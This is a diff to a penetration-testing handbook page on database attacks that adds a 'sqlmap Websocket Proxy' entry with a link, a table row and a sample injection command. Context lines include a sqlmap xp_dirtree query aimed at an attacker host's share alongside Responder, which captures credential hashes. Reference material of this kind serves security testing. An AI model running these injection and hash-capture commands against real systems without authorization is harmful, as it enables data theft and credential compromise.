@@ -17,6 +17,7 @@
 - [SQL Injection](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/04_database_assessment.md#SQL-Injetion)
 - [sqlite3](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/04_database_assessment.md#sqlite3)
 - [sqlmap](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/04_database_assessment.md#sqlmap)
+- [sqlmap Websocket Proxy](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/04_database_assessment.md#sqlmap-Websocket-Proxy)
 - [sqsh](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/04_database_assessment.md#sqsh)
 - [XPATH Injection](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/04_database_assessment.md#XPATH-Injection)
 
@@ -26,6 +27,7 @@
 | --- | --- | --- |
 | NoSQLMap | NoSQLMap is an open source Python tool designed to audit for as well as automate injection attacks and exploit default configuration weaknesses in NoSQL databases and web applications using NoSQL in order to disclose or clone data from the database. | https://github.com/codingo/NoSQLMap |
 | sqlmap | sqlmap is an open source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over of database servers. | https://github.com/sqlmapproject/sqlmap |
+| sqlmap Websocket Proxy | Tool to enable blind sql injection attacks against websockets using sqlmap | https://github.com/BKreisel/sqlmap-websocket-proxy |
 
 ## Hibernate Query Language Injection (HQLi)
 
@@ -777,6 +779,18 @@ $ sqlmap -r <REQUEST>.reg -p email --level 4 --risk 3 --batch
 ```c
 $ sudo python3 Responder.py -I <INTERFACE>
 $ sqlmap -r login.req --sql-query="exec master.dbo.xp_dirtree '\\\\<LHOST>\\share'"
+```
+
+## sqlmap Websocket Proxy
+
+> https://github.com/BKreisel/sqlmap-websocket-proxy
+
+```c
+$ sqlmap-websocket-proxy -u 'ws://ws.<RHOST>:5789/version' -p '{"version": "2\u0022 %param%"}' --json
+```
+
+```c
+$ sqlmap -u 'http://localhost:8080/?param1=1'
 ```
 
 ## sqsh
